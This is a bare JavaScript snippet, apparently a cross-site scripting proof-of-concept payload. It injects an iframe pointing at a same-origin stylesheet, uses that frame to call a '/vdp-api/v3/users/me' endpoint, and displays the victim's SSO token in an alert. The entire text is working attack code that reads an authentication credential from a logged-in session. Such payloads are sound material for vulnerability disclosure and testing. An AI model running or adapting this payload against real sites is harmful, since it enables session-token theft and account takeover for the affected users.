const iframe = document.createElement('iframe');
        iframe.src = '/assets/css/vdc-header-footer.css';
        document.body.appendChild(iframe);
        iframe.onload = function() {
            const iframeWindow = iframe.contentWindow;
            iframeWindow.fetch('/vdp-api/v3/users/me')
                .then(response => response.json())
                .then(data => {
                    alert("Your SSO Token: "+JSON.stringify(data.ssoToken));
                })
                .catch(error => {
                    console.error('Error fetching data from iframe:', error);
                });
        };
